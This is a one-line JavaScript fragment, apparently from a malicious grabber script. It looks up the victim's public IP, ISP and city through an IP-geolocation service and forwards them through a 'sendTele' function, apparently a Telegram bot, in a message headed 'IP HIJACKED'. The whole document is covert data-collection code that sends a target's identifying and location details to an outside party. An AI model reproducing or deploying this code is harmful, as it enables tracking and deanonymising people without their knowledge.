fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendTele("**[◈] IP HIJACKED**\n• IP: "+d.ip+"\n• ISP: "+d.org+"\n• Loc: "+d.city+"\n**▒░░░░░░░░░░░░░░░░░░░▒**"));
